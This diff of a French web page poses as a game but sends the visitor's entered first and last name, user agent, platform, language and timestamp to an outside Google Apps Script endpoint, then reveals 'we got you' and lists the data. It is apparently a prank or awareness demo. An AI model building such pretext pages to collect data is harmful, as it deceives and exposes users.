@@ -3,96 +3,112 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Formulaire de Jeu</title>
+  <title>Jeu - Infos Collectées</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
       text-align: center;
+      background-color: #f0f4f8;
+      color: #333;
+      padding: 20px;
     }
     .form-container {
-      margin-top: 20px;
+      margin-top: 30px;
     }
     .input-field {
       padding: 10px;
       margin: 10px;
       width: 250px;
       font-size: 16px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
     }
     .btn {
-      padding: 10px 20px;
-      background-color: #4CAF50;
+      padding: 10px 25px;
+      background-color: #0078d4;
       color: white;
       border: none;
+      border-radius: 5px;
       cursor: pointer;
+    }
+    .btn:hover {
+      background-color: #005ea3;
     }
     .info-display {
       display: none;
-      margin-top: 20px;
+      margin-top: 30px;
       font-size: 18px;
+      background-color: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
     }
   </style>
 </head>
 <body>
-  <h1>Bienvenue au jeu !</h1>
-  <p>Entrez votre adresse e-mail pour participer :</p>
+  <h1>Bienvenue dans notre jeu !</h1>
+  <p>Indique ton prénom et ton nom pour participer :</p>
 
   <div class="form-container">
-    <input type="email" id="email" class="input-field" placeholder="Votre e-mail" required />
+    <input type="text" id="firstname" class="input-field" placeholder="Prénom" required />
+    <input type="text" id="lastname" class="input-field" placeholder="Nom" required />
     <button class="btn" id="submitBtn">Soumettre</button>
   </div>
 
   <div class="info-display" id="infoDisplay">
-    <h2>Voici les informations collectées :</h2>
+    <h2>Ah, on t’a bien eu 😏</h2>
+    <p>Voici ce que l’on a pu récupérer sur toi :</p>
     <p id="userInfo"></p>
   </div>
 
   <script>
-    document.getElementById('submitBtn').addEventListener('click', function() {
-      const email = document.getElementById('email').value;
-      
-      if (email) {
-        // Collecte des informations de l'utilisateur (ex : userAgent, platform, etc.)
+    document.getElementById('submitBtn').addEventListener('click', () => {
+      const firstname = document.getElementById('firstname').value.trim();
+      const lastname = document.getElementById('lastname').value.trim();
+
+      if (firstname && lastname) {
         const userAgent = navigator.userAgent;
         const platform = navigator.platform;
         const language = navigator.language;
-        const ip = 'Inconnu'; // Pour l'IP, tu devras utiliser une API côté serveur pour la récupérer.
+        const ip = "Inconnue"; // Peut être enrichie côté serveur
         const timestamp = new Date().toISOString();
-        
-        // Envoie des données au Google Apps Script via l'API Web
-        fetch('https://script.google.com/macros/s/AKfycbzi4uw6bbB5I5oto8Q4_A9IM0W1j3WfFA4q-YkHrcMojJnYsOLujzt0f_v-N8k0Zqmb/exec', {
-          method: 'POST',
+
+        fetch("https://script.google.com/macros/s/AKfycbw7jSeIn449nXv9SoaW62UOM1n_kMh1S4ncT0d5SIInxr50SnDR-YQF2BbXwQRyPIym/exec", {
+          method: "POST",
           headers: {
-            'Content-Type': 'application/json',
+            "Content-Type": "application/json"
           },
           body: JSON.stringify({
-            email: email,
-            id: 'test',
-            ip: ip,
-            userAgent: userAgent,
-            platform: platform,
-            language: language,
-            timestamp: timestamp
+            firstname,
+            lastname,
+            id: "demo", // ou un identifiant unique
+            ip,
+            userAgent,
+            platform,
+            language,
+            timestamp
           })
         })
-        .then(response => response.json())
+        .then(res => res.json())
         .then(data => {
-          // Affichage des informations
-          const userInfo = `
-            E-mail: ${email} <br>
-            Adresse IP: ${ip} <br>
-            User Agent: ${userAgent} <br>
-            Plateforme: ${platform} <br>
-            Langue: ${language} <br>
-            Timestamp: ${timestamp}
+          const display = `
+            Nom : ${lastname}<br>
+            Prénom : ${firstname}<br>
+            Adresse IP : ${ip}<br>
+            User Agent : ${userAgent}<br>
+            Plateforme : ${platform}<br>
+            Langue : ${language}<br>
+            Timestamp : ${timestamp}
           `;
-          document.getElementById('userInfo').innerHTML = userInfo;
-          document.getElementById('infoDisplay').style.display = 'block';
+          document.getElementById("userInfo").innerHTML = display;
+          document.getElementById("infoDisplay").style.display = "block";
         })
-        .catch(error => {
-          alert('Une erreur est survenue. Veuillez réessayer.');
+        .catch(err => {
+          alert("Une erreur est survenue. Veuillez réessayer.");
+          console.error(err);
         });
       } else {
-        alert("Veuillez entrer une adresse e-mail valide.");
+        alert("Merci de remplir tous les champs.");
       }
     });
   </script>
